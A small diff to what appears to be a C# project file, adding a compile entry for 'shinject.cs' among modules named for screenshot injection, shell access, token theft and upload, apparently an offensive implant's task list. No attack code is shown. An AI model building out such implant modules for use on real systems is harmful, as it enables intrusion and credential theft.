@@ -74,6 +74,7 @@
     <Compile Include="screenshot.cs" />
     <Compile Include="screenshot_inject.cs" />
     <Compile Include="shell.cs" />
+    <Compile Include="shinject.cs" />
     <Compile Include="sleep.cs" />
     <Compile Include="steal_token.cs" />
     <Compile Include="upload.cs" />
